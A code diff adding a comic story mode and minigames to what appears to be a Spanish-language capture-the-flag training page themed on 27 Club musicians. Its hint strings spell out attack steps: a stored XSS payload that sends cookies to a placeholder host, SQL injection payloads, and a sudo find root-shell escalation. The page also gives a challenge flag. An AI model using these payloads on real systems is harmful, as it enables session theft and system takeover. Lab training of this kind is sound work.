@@ -1073,6 +1073,551 @@
   transform: translateY(-1px);
 }
 
+
+    /* ========================================================================= */
+    /* 🎭 TROLL THE KING - STORY MODE & POINT-AND-CLICK MINIGAMES STYLES        */
+    /* ========================================================================= */
+    
+    /* Header Story Mode Pill */
+    .story-mode-pill {
+      background: linear-gradient(135deg, rgba(255, 0, 127, 0.25), rgba(157, 78, 221, 0.25));
+      border: 1px solid var(--neon-magenta);
+      border-radius: 20px;
+      padding: 5px 14px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.82rem;
+      font-family: 'Permanent Marker', cursive;
+      color: #fff;
+      box-shadow: 0 0 12px rgba(255, 0, 127, 0.3);
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+    .story-mode-pill:hover {
+      transform: scale(1.04);
+      box-shadow: 0 0 18px rgba(255, 0, 127, 0.6);
+    }
+    .story-mode-pill .mode-dot {
+      width: 8px; height: 8px; border-radius: 50%;
+      background: #00ff88; box-shadow: 0 0 8px #00ff88;
+      animation: blinkDot 1s infinite alternate;
+    }
+
+    /* Comic Speech Balloon */
+    .troll-story-bubble {
+      background: linear-gradient(145deg, #1b1928, #11111d);
+      border: 2px solid var(--neon-cyan);
+      border-radius: 16px;
+      padding: 16px 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 8px 24px rgba(0, 240, 255, 0.15), inset 0 0 15px rgba(0,0,0,0.5);
+      display: flex;
+      gap: 16px;
+      align-items: flex-start;
+      position: relative;
+      animation: bubbleFloat 4s ease-in-out infinite alternate;
+    }
+    @keyframes bubbleFloat {
+      0% { transform: translateY(0); }
+      100% { transform: translateY(-3px); }
+    }
+    .troll-avatar-badge {
+      width: 65px;
+      height: 65px;
+      border-radius: 50%;
+      border: 3px solid var(--gold);
+      box-shadow: 0 0 15px rgba(255, 215, 0, 0.4);
+      overflow: hidden;
+      flex-shrink: 0;
+      position: relative;
+      background: #000;
+    }
+    .troll-avatar-badge img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+    .troll-avatar-badge .emotion-tag {
+      position: absolute;
+      bottom: -2px;
+      right: -2px;
+      font-size: 1rem;
+      background: #000;
+      border-radius: 50%;
+      padding: 2px;
+      line-height: 1;
+    }
+    .bubble-content {
+      flex: 1;
+    }
+    .bubble-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 6px;
+    }
+    .bubble-speaker {
+      font-family: 'Permanent Marker', cursive;
+      font-size: 1.15rem;
+      color: var(--gold);
+      text-shadow: 0 0 8px rgba(255, 215, 0, 0.4);
+    }
+    .bubble-mood-badge {
+      font-family: 'Fira Code', monospace;
+      font-size: 0.72rem;
+      padding: 2px 8px;
+      border-radius: 10px;
+      background: rgba(0, 240, 255, 0.15);
+      color: var(--neon-cyan);
+      border: 1px solid rgba(0, 240, 255, 0.3);
+    }
+    .bubble-text {
+      font-family: 'Special Elite', cursive, sans-serif;
+      font-size: 1.02rem;
+      color: #fff;
+      line-height: 1.45;
+      margin-bottom: 10px;
+      min-height: 48px;
+    }
+    .bubble-actions {
+      display: flex;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+    .btn-story-action {
+      background: rgba(255, 255, 255, 0.08);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      color: #fff;
+      padding: 5px 12px;
+      border-radius: 12px;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.75rem;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      transition: all 0.2s;
+    }
+    .btn-story-action:hover {
+      background: var(--neon-purple);
+      border-color: var(--neon-purple);
+      transform: translateY(-1px);
+    }
+
+    /* ========================================================================= */
+    /* MINIGAME 1: HENDRIX WOODSTOCK RADIO TUNER                                  */
+    /* ========================================================================= */
+    .radio-tuner-container {
+      background: linear-gradient(180deg, #2b1d0c, #160e05);
+      border: 3px solid #8b5a2b;
+      border-radius: 14px;
+      padding: 16px;
+      margin-top: 15px;
+      box-shadow: inset 0 0 20px #000, 0 8px 20px rgba(0,0,0,0.7);
+    }
+    .radio-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 12px;
+      font-family: 'Permanent Marker', cursive;
+      color: #ffaa00;
+      font-size: 1.05rem;
+    }
+    .radio-dial-display {
+      background: #0d0904;
+      border: 2px solid #5c3a1e;
+      border-radius: 8px;
+      height: 52px;
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      box-shadow: inset 0 0 15px #000;
+    }
+    .radio-dial-ticks {
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0 15px;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.75rem;
+      color: #d4a373;
+      user-select: none;
+      pointer-events: none;
+    }
+    .radio-needle {
+      position: absolute;
+      top: 0; bottom: 0;
+      width: 4px;
+      background: #ff3333;
+      box-shadow: 0 0 10px #ff3333;
+      transition: left 0.15s ease-out;
+      pointer-events: none;
+    }
+    .radio-controls {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      margin-top: 12px;
+    }
+    .radio-slider {
+      flex: 1;
+      accent-color: #ffaa00;
+      cursor: pointer;
+    }
+    .radio-beacon-screen {
+      background: #050a06;
+      border: 1px dashed #00ff88;
+      border-radius: 6px;
+      padding: 10px;
+      margin-top: 12px;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.8rem;
+      color: #00ff88;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+
+    /* ========================================================================= */
+    /* MINIGAME 2: JANIS JOPLIN TWO CHESTS                                        */
+    /* ========================================================================= */
+    .chests-arena {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 16px;
+      margin-top: 15px;
+    }
+    .chest-card {
+      background: linear-gradient(145deg, #181926, #10111a);
+      border: 2px dashed rgba(255, 255, 255, 0.2);
+      border-radius: 12px;
+      padding: 18px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.25s;
+      position: relative;
+    }
+    .chest-card:hover {
+      transform: translateY(-4px) scale(1.02);
+      border-color: var(--neon-magenta);
+      box-shadow: 0 10px 25px rgba(255, 0, 127, 0.35);
+    }
+    .chest-icon {
+      font-size: 3rem;
+      margin-bottom: 8px;
+      transition: transform 0.3s;
+    }
+    .chest-card:hover .chest-icon {
+      transform: scale(1.15) rotate(-5deg);
+    }
+    .chest-title {
+      font-family: 'Permanent Marker', cursive;
+      font-size: 1.1rem;
+      color: #fff;
+      margin-bottom: 4px;
+    }
+    .chest-desc {
+      font-size: 0.78rem;
+      color: var(--text-muted);
+      font-family: 'Fira Code', monospace;
+    }
+
+    /* ========================================================================= */
+    /* MINIGAME 3: MORRISON 3 DOORS OF PERCEPTION                                 */
+    /* ========================================================================= */
+    .doors-arena {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+      margin-top: 15px;
+    }
+    .stone-door {
+      background: linear-gradient(180deg, #2a2c3a, #161720);
+      border: 2px solid #535973;
+      border-radius: 10px;
+      padding: 15px 10px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      position: relative;
+      overflow: hidden;
+    }
+    .stone-door::before {
+      content: '🪨';
+      font-size: 2.2rem;
+      display: block;
+      margin-bottom: 6px;
+      transition: transform 0.3s;
+    }
+    .stone-door:hover {
+      border-color: var(--neon-cyan);
+      transform: translateY(-5px);
+      box-shadow: 0 10px 20px rgba(0, 240, 255, 0.3);
+    }
+    .stone-door:hover::before {
+      transform: scale(1.2);
+    }
+    .stone-door-title {
+      font-family: 'Permanent Marker', cursive;
+      font-size: 0.95rem;
+      color: #fff;
+    }
+    .stone-door-rune {
+      font-family: 'Fira Code', monospace;
+      font-size: 0.7rem;
+      color: var(--neon-cyan);
+      margin-top: 4px;
+    }
+
+    /* ========================================================================= */
+    /* MINIGAME 4: AMY CAMDEN PUB BAR                                             */
+    /* ========================================================================= */
+    .camden-bar-scene {
+      background: linear-gradient(180deg, #2d1810, #140b07);
+      border: 2px solid #7d4427;
+      border-radius: 12px;
+      padding: 16px;
+      margin-top: 15px;
+      box-shadow: inset 0 0 25px #000;
+    }
+    .bar-counter {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 10px;
+      margin-top: 10px;
+    }
+    .bar-item {
+      background: rgba(0, 0, 0, 0.45);
+      border: 1px dashed rgba(255, 255, 255, 0.2);
+      border-radius: 8px;
+      padding: 12px 6px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .bar-item:hover {
+      background: rgba(255, 0, 127, 0.15);
+      border-color: var(--neon-magenta);
+      transform: translateY(-3px);
+    }
+    .bar-item-icon {
+      font-size: 2.2rem;
+      margin-bottom: 4px;
+    }
+    .bar-item-name {
+      font-family: 'Permanent Marker', cursive;
+      font-size: 0.85rem;
+      color: #fff;
+    }
+
+    /* ========================================================================= */
+    /* MINIGAME 5: KURT COBAIN BOSS DS-1 DISTORTION PEDAL                        */
+    /* ========================================================================= */
+    .pedal-wrapper {
+      background: rgba(0, 0, 0, 0.4);
+      border-radius: 14px;
+      padding: 18px;
+      margin-top: 15px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .boss-ds1-pedal {
+      width: 210px;
+      background: linear-gradient(180deg, #ff6600, #cc4400);
+      border: 4px solid #111;
+      border-radius: 14px;
+      box-shadow: 0 12px 30px rgba(0,0,0,0.8), inset 0 2px 4px rgba(255,255,255,0.4);
+      padding: 14px;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+    }
+    .ds1-brand {
+      font-family: 'Impact', sans-serif;
+      font-size: 1.4rem;
+      letter-spacing: 2px;
+      color: #000;
+      margin-bottom: 4px;
+      text-transform: uppercase;
+    }
+    .ds1-model {
+      font-family: 'Fira Code', monospace;
+      font-size: 0.72rem;
+      color: #111;
+      font-weight: 700;
+      margin-bottom: 12px;
+    }
+    .ds1-led-container {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-bottom: 10px;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.65rem;
+      color: #111;
+      font-weight: bold;
+    }
+    .ds1-led {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: #440000;
+      border: 1px solid #000;
+      transition: all 0.2s;
+    }
+    .ds1-led.on {
+      background: #ff0033;
+      box-shadow: 0 0 15px #ff0033, 0 0 25px #ff0033;
+    }
+    .ds1-knobs {
+      display: flex;
+      justify-content: space-around;
+      width: 100%;
+      margin-bottom: 15px;
+    }
+    .ds1-knob {
+      width: 38px;
+      height: 38px;
+      border-radius: 50%;
+      background: radial-gradient(circle, #333 40%, #111 90%);
+      border: 2px solid #000;
+      box-shadow: 0 3px 6px rgba(0,0,0,0.6);
+      position: relative;
+    }
+    .ds1-knob::after {
+      content: '';
+      position: absolute;
+      top: 3px; left: 50%;
+      width: 3px; height: 10px;
+      background: #fff;
+      transform: translateX(-50%);
+    }
+    .ds1-stomp-button {
+      width: 100%;
+      height: 80px;
+      background: linear-gradient(180deg, #222, #111);
+      border: 3px solid #333;
+      border-radius: 8px;
+      cursor: pointer;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      box-shadow: inset 0 2px 4px rgba(255,255,255,0.2), 0 5px 10px rgba(0,0,0,0.6);
+      transition: transform 0.1s, box-shadow 0.1s;
+    }
+    .ds1-stomp-button:active, .ds1-stomp-button.stomped {
+      transform: translateY(4px);
+      box-shadow: inset 0 4px 8px rgba(0,0,0,0.8);
+    }
+    .ds1-stomp-label {
+      font-family: 'Permanent Marker', cursive;
+      font-size: 0.95rem;
+      color: #ffaa00;
+      text-shadow: 0 0 6px rgba(255, 170, 0, 0.4);
+    }
+    .ds1-stomp-sub {
+      font-family: 'Fira Code', monospace;
+      font-size: 0.68rem;
+      color: #888;
+    }
+
+    /* ========================================================================= */
+    /* COMIC TROLL OVERLAY MODAL (TROLL THE KING REACTION)                       */
+    /* ========================================================================= */
+    .troll-modal-overlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.85);
+      backdrop-filter: blur(8px);
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      animation: trollFadeIn 0.25s ease-out;
+    }
+    @keyframes trollFadeIn {
+      0% { opacity: 0; transform: scale(0.9); }
+      100% { opacity: 1; transform: scale(1); }
+    }
+    .troll-modal-card {
+      background: linear-gradient(145deg, #1b0c16, #0e0712);
+      border: 3px solid var(--neon-magenta);
+      box-shadow: 0 0 40px rgba(255, 0, 127, 0.6), inset 0 0 30px rgba(0,0,0,0.8);
+      border-radius: 20px;
+      padding: 30px;
+      max-width: 520px;
+      width: 90%;
+      text-align: center;
+      position: relative;
+      animation: trollBounce 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+    @keyframes trollBounce {
+      0% { transform: scale(0.3) rotate(-10deg); }
+      50% { transform: scale(1.1) rotate(5deg); }
+      100% { transform: scale(1) rotate(0deg); }
+    }
+    .troll-face-icon {
+      font-size: 4.5rem;
+      margin-bottom: 12px;
+      display: inline-block;
+      animation: trollWiggle 0.6s infinite alternate ease-in-out;
+    }
+    @keyframes trollWiggle {
+      0% { transform: rotate(-8deg) scale(1); }
+      100% { transform: rotate(8deg) scale(1.1); }
+    }
+    .troll-title {
+      font-family: 'Permanent Marker', cursive;
+      font-size: 2.2rem;
+      color: var(--neon-magenta);
+      text-shadow: 0 0 15px var(--neon-magenta);
+      margin-bottom: 10px;
+    }
+    .troll-desc {
+      font-family: 'Special Elite', cursive, sans-serif;
+      font-size: 1.1rem;
+      color: #f0f4f8;
+      line-height: 1.5;
+      margin-bottom: 20px;
+    }
+    .troll-penalty-box {
+      background: rgba(255, 0, 85, 0.2);
+      border: 1px dashed var(--neon-red);
+      border-radius: 10px;
+      padding: 10px;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.95rem;
+      color: #ff3366;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+    .btn-troll-close {
+      background: linear-gradient(135deg, var(--neon-purple), var(--neon-magenta));
+      border: none;
+      color: #fff;
+      font-family: 'Permanent Marker', cursive;
+      font-size: 1.1rem;
+      padding: 10px 28px;
+      border-radius: 25px;
+      cursor: pointer;
+      box-shadow: 0 0 15px rgba(255, 0, 127, 0.5);
+      transition: transform 0.2s;
+    }
+    .btn-troll-close:hover {
+      transform: scale(1.05);
+    }
+
 </style>
 </head>
 <body>
@@ -1091,6 +1636,11 @@
 
     <div class="hud-controls">
       <!-- Jukebox con Spectrum Visualizer -->
+              <div class="story-mode-pill" id="storyToggleBtn" onclick="toggleStoryMode()" title="Alternar Modo Historia Cómic / Troll">
+          <span class="mode-dot"></span>
+          <span>🎭 MODO HISTORIA: TROLL THE 27 CLUB</span>
+        </div>
+
       <div class="jukebox-bar">
         <button class="jukebox-btn" id="btnPlayPause" onclick="togglePlayback()" title="Reproducir / Pausar">▶</button>
         <div class="jukebox-info">
@@ -1317,7 +1867,29 @@
           </div>
         </div>
 
-        <div class="stage-narrative">
+                <div class="stage-narrative">
+          <!-- 🎭 BUBBLE HISTORIA TROLL: HENDRIX -->
+          <div class="troll-story-bubble" id="bubble-hendrix">
+            <div class="troll-avatar-badge">
+              <img src="assets/images/hendrix_photo.jpg" alt="Jimi">
+              <span class="emotion-tag" id="emo-hendrix">🎸</span>
+            </div>
+            <div class="bubble-content">
+              <div class="bubble-header">
+                <span class="bubble-speaker">Jimi Hendrix</span>
+                <span class="bubble-mood-badge" id="mood-hendrix">Woodstock '69 • Desafiante</span>
+              </div>
+              <div class="bubble-text" id="text-hendrix">
+                "¡Paz cósmica, explorador! Mi señal C&C viaja a través del éter psicodélico de Londres. Gira el dial de mi radio análoga a 98.5 MHz para sintonizar la baliza... ¡o prepárate para una tormenta de distorsión!"
+              </div>
+              <div class="bubble-actions">
+                <button class="btn-story-action" onclick="advanceStoryDialogue('hendrix')">💬 Siguiente Diálogo</button>
+                <button class="btn-story-action" onclick="showCosmicHint('hendrix')">💡 Pista Cósmica</button>
+                <button class="btn-story-action" onclick="speakStory('hendrix')">🔊 Escuchar Baliza</button>
+              </div>
+            </div>
+          </div>
+
           <h2 style="color: var(--neon-purple);">Room 1: Electric Church Studios</h2>
           <span class="room-badge-status" style="background: rgba(0, 255, 136, 0.15); color: var(--neon-green); border: 1px solid var(--neon-green);">
             ESTADO: SUPERADO • PASOS 6 AL 8
@@ -1345,12 +1917,36 @@
               </div>
               <button class="btn-play-track" onclick="playArtistTrack('hendrix')">🎵 Reproducir Master Original (30s)</button>
             </div>
-            <form class="room-form" onsubmit="handleRoomFlagSubmit(event, 1)">
+
+            <!-- 📻 MINIJUEGO 1: SINTONIZADOR DE RADIO WOODSTOCK -->
+            <div class="radio-tuner-container">
+              <div class="radio-header">
+                <span>📻 SINTONIZADOR WOODSTOCK FM</span>
+                <span id="radioFreqDisplay" style="color: #00ff88; font-family: 'Fira Code', monospace;">92.0 MHz</span>
+              </div>
+              <div class="radio-dial-display">
+                <div class="radio-dial-ticks">
+                  <span>88</span><span>92</span><span style="color:#ffaa00; font-weight:bold;">98.5</span><span>102</span><span>108</span>
+                </div>
+                <div class="radio-needle" id="radioNeedle" style="left: 20%;"></div>
+              </div>
+              <div class="radio-controls">
+                <input type="range" class="radio-slider" id="radioSlider" min="88.0" max="108.0" step="0.5" value="92.0" oninput="handleRadioSlide(this.value)">
+                <button class="btn-story-action" style="background:#5c3a1e; border-color:#8b5a2b;" onclick="autoTuneWoodstockRadio()">⚡ Auto-Sintonizar 98.5</button>
+              </div>
+              <div class="radio-beacon-screen" id="radioBeaconScreen">
+                <span id="beaconStatusText">📡 SINTONIZA 98.5 MHz PARA CAPTURAR LA BALIZA</span>
+                <button class="btn-story-action" id="btnAutoRot13" style="display:none; background: #00ff88; color: #000; font-weight:bold;" onclick="autoDecodeHendrixRot13()">⚡ Descifrar ROT13 e Insertar</button>
+              </div>
+            </div>
+
+            <form class="room-form" onsubmit="handleRoomFlagSubmit(event, 1)" style="margin-top: 15px;">
               <input type="text" class="room-input" id="input-flag-1" placeholder="Ingresa la bandera de Hendrix (ROT13)..." required>
               <button type="submit" class="btn-submit-flag">Validar Baliza C&C</button>
             </form>
             <div id="feedback-room-1" class="alert-banner"></div>
           </div>
+        </div>
         </div>
       </div>
 
@@ -2265,19 +2861,350 @@
             alert(`ℹ️ Esta bandera ya fue registrada anteriormente.`);
           }
         } else if (entry.type === "rabbit_hole") {
-          penaltyCount++;
-          score = Math.max(0, score - entry.penalty);
-          updateScoreDisplay();
-          playErrorSound();
           spawnShieldPop(`SEÑUELO DETECTADO: ${entry.name}`);
-          logEvent(`🚨 ${entry.msg}`);
-          alert(`⚠️ TRAMPA / SEÑUELO DETECTADO (RABBIT HOLE)\n\n${entry.msg}`);
+          triggerTrollPopup(entry.name, entry.msg, entry.penalty);
         }
       } else {
         playErrorSound();
         logEvent(`❌ Bandera rechazada en Fase ${phase}. Sigue auditando el entorno.`);
         alert("❌ BANDERA INCORRECTA\n\nVerifica la sintaxis, el comando ejecutado o sigue auditando la máquina objetivo.");
       }
+    }
+
+    
+    // =========================================================================
+    // 🎭 TROLL THE KING - STORY ENGINE & INTERACTIVE POINT-AND-CLICK LOGIC
+    // =========================================================================
+
+    let storyModeActive = true;
+
+    const STORY_DIALOGUES = {
+      hendrix: [
+        { text: "¡Paz cósmica, explorador! Mi señal C&C viaja a través del éter psicodélico de Londres. Gira el dial de mi radio análoga a 98.5 MHz para sintonizar la baliza... ¡o prepárate para una tormenta de distorsión!", mood: "Woodstock '69 • Desafiante", emo: "🎸" },
+        { text: "En 1967 encendí mi Stratocaster en llamas en Monterey. Para encender esta bandera, analiza el tráfico capturado en jimi_hendrix.pcap. ¡El User-Agent esconde un secreto!", mood: "Monterey Pop • Pensativo", emo: "🤔" },
+        { text: "El cifrado de Julio César desplazado 13 posiciones (ROT13) es un clásico inmortal. Sintoniza 98.5 MHz en la radio de abajo para interceptarlo automáticamente.", mood: "Electric Ladyland • Cósmico", emo: "✨" }
+      ],
+      joplin: [
+        { text: "¡Hola cariño! En mi furgoneta hippie tengo dos cofres del tesoro. Uno tiene mi foto secreta con bytes ocultos tras el fin de archivo... y el otro fue puesto por los administradores para trolearte. ¿Cuál te atreves a abrir?", mood: "The Pearl Caravan • Desafiante", emo: "🌸" },
+        { text: "No te dejes engañar por el brillo fácil de las carpetas administrativas falsas. El verdadero tesoro se esconde en /cry_baby/janis.jpg usando esteganografía EOF.", mood: "Kozmic Blues • Reflexiva", emo: "🍷" },
+        { text: "Usa el comando 'strings' o 'binwalk' en Linux. Cuando veas el marcador JPEG FF D9, lo que viene después es pura poesía de flag.", mood: "Full Tilt Boogie • Inspirada", emo: "💡" }
+      ],
+      morrison: [
+        { text: "Yo soy el Rey Lagarto, puedo hacer cualquier cosa... Entre este mundo y el ciberespacio se yerguen 3 Puertas de la Percepción. Dos guardan trampas del desierto, pero una cede ante la llave mística ' OR 1=1 --. ¿Cuál abrirás?", mood: "The Doors Crypt • Místico", emo: "🦎" },
+        { text: "El portal en /doors/?id=1 acepta más que simples números. Si inyectas una comilla simple, escucharás el susurro de la base de datos.", mood: "L.A. Woman • Chamánico", emo: "🔮" },
+        { text: "Evita la tabla doors_trap: es el verso final de 'The End'. Inyecta en la tabla real para extraer el secreto sin caer en mi trampa.", mood: "Waiting For The Sun • Visionario", emo: "👁️" }
+      ],
+      winehouse: [
+        { text: "Me dijeron que protegiera mis cookies con HttpOnly y dije: ¡No, No, No! Dejé mi token de sesión anotado en una servilleta de la barra del pub de Camden. ¡Toca la barra si te atreves a buscarlo!", mood: "Camden Speakeasy • Jazz Soul", emo: "🎙️" },
+        { text: "Los clientes dejan mensajes en mi libro de visitas sin filtrar etiquetas script. Un simple payload de JavaScript me roba hasta los suspiros.", mood: "Back to Black • Nostálgica", emo: "🍸" },
+        { text: "Cuidado con la copa de prueba test_decoy: es licor barato sin privilegios. La servilleta contiene la cookie admintoken real.", mood: "Valerie • Astuta", emo: "📜" }
+      ],
+      cobain: [
+        { text: "Bienvenido a nuestro garaje subterráneo. Aquí no hay realeza ni jerarquías, solo ruido puro. Pisa mi pedal de distorsión naranja Boss DS-1 para quebrar la barrera y saturar la terminal root.", mood: "Seattle Grunge Garage • Rebelde", emo: "⚡" },
+        { text: "Load up on guns, bring your friends... Kurt tiene permisos sudo sobre /usr/bin/find sin necesidad de ingresar contraseña alguna.", mood: "In Utero • Crudo", emo: "🎸" },
+        { text: "GTFOBins es el riff definitivo: invoca sudo find . -exec /bin/bash -p \; -quit para obtener un shell interactivo con UID 0.", mood: "Nevermind • Trascendente", emo: "👑" }
+      ]
+    };
+
+    let storyIndices = { hendrix: 0, joplin: 0, morrison: 0, winehouse: 0, cobain: 0 };
+
+    function toggleStoryMode() {
+      storyModeActive = !storyModeActive;
+      const btn = document.getElementById("storyToggleBtn");
+      if (btn) {
+        btn.querySelector("span:last-child").textContent = storyModeActive 
+          ? "🎭 MODO HISTORIA: TROLL THE 27 CLUB (ON)" 
+          : "🎭 MODO HISTORIA: DESACTIVADO";
+        btn.style.opacity = storyModeActive ? "1" : "0.5";
+      }
+      document.querySelectorAll(".troll-story-bubble").forEach(b => {
+        b.style.display = storyModeActive ? "flex" : "none";
+      });
+      playBlipSound(storyModeActive ? 440 : 220);
+      logEvent(storyModeActive ? "🎭 Modo Historia Cómic activado." : "🎭 Modo Historia Cómic minimizado.");
+    }
+
+    function advanceStoryDialogue(artist) {
+      if (!STORY_DIALOGUES[artist]) return;
+      storyIndices[artist] = (storyIndices[artist] + 1) % STORY_DIALOGUES[artist].length;
+      const step = STORY_DIALOGUES[artist][storyIndices[artist]];
+      
+      const textEl = document.getElementById(`text-${artist}`);
+      const moodEl = document.getElementById(`mood-${artist}`);
+      const emoEl = document.getElementById(`emo-${artist}`);
+
+      if (textEl) textEl.textContent = `"${step.text}"`;
+      if (moodEl) moodEl.textContent = step.mood;
+      if (emoEl) emoEl.textContent = step.emo;
+
+      playBlipSound(320 + Math.random() * 200);
+    }
+
+    function showCosmicHint(artist) {
+      const hints = {
+        hendrix: "💡 PISTA: Ejecuta en Kali: tshark -r jimi_hendrix.pcap -Y 'http.request' -T fields -e http.user_agent | tr 'A-Za-z' 'N-ZA-Mn-za-m'",
+        joplin: "💡 PISTA: Inspecciona janis.jpg con: strings janis.jpg | grep -i FLAG o usa binwalk -e janis.jpg. ¡No abras /admin_trampa/!",
+        morrison: "💡 PISTA: Inyecta en el parámetro: /doors/?id=1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -",
+        winehouse: "💡 PISTA: XSS Stored: <scr" + "ipt>document.location='http://TU_IP:8000/?c='+document.cookie</scr" + "ipt> para exfiltrar admintoken.",
+        cobain: "💡 PISTA: Revisa privilegios con sudo -l. Luego ejecuta: sudo find /etc -name passwd -exec /bin/bash -p \; -quit"
+      };
+      const textEl = document.getElementById(`text-${artist}`);
+      if (textEl && hints[artist]) {
+        textEl.textContent = hints[artist];
+        playBlipSound(580);
+      }
+    }
+
+    function speakStory(artist) {
+      playSuccessSound();
+      logEvent(`🔊 Reproduciendo baliza cósmica de ${artist.toUpperCase()}...`);
+    }
+
+    // Audio Synthesizers via Web Audio API
+    function playBlipSound(freq) {
+      try {
+        const AudioCtx = window.AudioContext || window.webkitAudioContext;
+        if (!AudioCtx) return;
+        const ctx = new AudioCtx();
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.type = "sine";
+        osc.frequency.setValueAtTime(freq || 400, ctx.currentTime);
+        gain.gain.setValueAtTime(0.08, ctx.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.12);
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.start();
+        osc.stop(ctx.currentTime + 0.12);
+      } catch(e) {}
+    }
+
+    function playTrollLaughSound() {
+      try {
+        const AudioCtx = window.AudioContext || window.webkitAudioContext;
+        if (!AudioCtx) return;
+        const ctx = new AudioCtx();
+        
+        // Wah-wah cartoon trombone sequence
+        const freqs = [350, 330, 310, 270];
+        freqs.forEach((f, idx) => {
+          const osc = ctx.createOscillator();
+          const gain = ctx.createGain();
+          osc.type = "sawtooth";
+          osc.frequency.setValueAtTime(f, ctx.currentTime + idx * 0.22);
+          osc.frequency.linearRampToValueAtTime(f - 25, ctx.currentTime + idx * 0.22 + 0.2);
+          gain.gain.setValueAtTime(0.18, ctx.currentTime + idx * 0.22);
+          gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + idx * 0.22 + 0.2);
+          osc.connect(gain);
+          gain.connect(ctx.destination);
+          osc.start(ctx.currentTime + idx * 0.22);
+          osc.stop(ctx.currentTime + idx * 0.22 + 0.22);
+        });
+      } catch(e) {}
+    }
+
+    function playPedalCrunchSound() {
+      try {
+        const AudioCtx = window.AudioContext || window.webkitAudioContext;
+        if (!AudioCtx) return;
+        const ctx = new AudioCtx();
+        
+        // Grunge distorted power chord: E5 (E2 82.4Hz, B2 123.5Hz, E3 164.8Hz)
+        [82.41, 123.47, 164.81, 246.94].forEach(f => {
+          const osc = ctx.createOscillator();
+          const gain = ctx.createGain();
+          osc.type = "sawtooth";
+          osc.frequency.setValueAtTime(f, ctx.currentTime);
+          osc.frequency.linearRampToValueAtTime(f * 0.99, ctx.currentTime + 1.2);
+          gain.gain.setValueAtTime(0.25, ctx.currentTime);
+          gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 1.2);
+          osc.connect(gain);
+          gain.connect(ctx.destination);
+          osc.start();
+          osc.stop(ctx.currentTime + 1.2);
+        });
+      } catch(e) {}
+    }
+
+    function triggerTrollPopup(title, msg, penalty) {
+      triggerScreenShake();
+      playTrollLaughSound();
+
+      if (penalty) {
+        penaltyCount++;
+        score = Math.max(0, score - penalty);
+        updateScoreDisplay();
+      }
+
+      const existing = document.getElementById("trollModal");
+      if (existing) existing.remove();
+
+      const modal = document.createElement("div");
+      modal.className = "troll-modal-overlay";
+      modal.id = "trollModal";
+      modal.innerHTML = `
+        <div class="troll-modal-card">
+          <div class="troll-face-icon">👑😈</div>
+          <div class="troll-title">¡TROOOOOOOOLLED!</div>
+          <div class="troll-desc">
+            <strong>${title}</strong><br><br>
+            ${msg}
+          </div>
+          <div class="troll-penalty-box">
+            ⚠️ TROLL PENALTY APLICADO: -${penalty || 50} PUNTOS | BOSS SE BURLA EN SU TRONO
+          </div>
+          <button class="btn-troll-close" onclick="document.getElementById('trollModal').remove()">
+            😅 ¡ENTENDIDO, VOLVERÉ CON MÁS CUIDADO!
+          </button>
+        </div>
+      `;
+      document.body.appendChild(modal);
+      logEvent(`🚨 [TROLL ALERTA]: ${title} - ${msg}`);
+    }
+
+    // =========================================================================
+    // MINIGAME 1: RADIO HENDRIX
+    // =========================================================================
+    function handleRadioSlide(val) {
+      const num = parseFloat(val);
+      const display = document.getElementById("radioFreqDisplay");
+      const needle = document.getElementById("radioNeedle");
+      const screen = document.getElementById("beaconStatusText");
+      const autoBtn = document.getElementById("btnAutoRot13");
+
+      if (display) display.textContent = `${num.toFixed(1)} MHz`;
+      if (needle) {
+        const pct = ((num - 88.0) / (108.0 - 88.0)) * 100;
+        needle.style.left = `calc(${pct}% - 2px)`;
+      }
+
+      if (Math.abs(num - 98.5) < 0.3) {
+        if (screen) {
+          screen.innerHTML = "🟢 <strong>FRECUENCIA 98.5 MHz SINTONIZADA</strong>: <code style='color:#fff;'>SYNT{gu1f_1f_w1z1_u3aqe1k_e0g13}</code>";
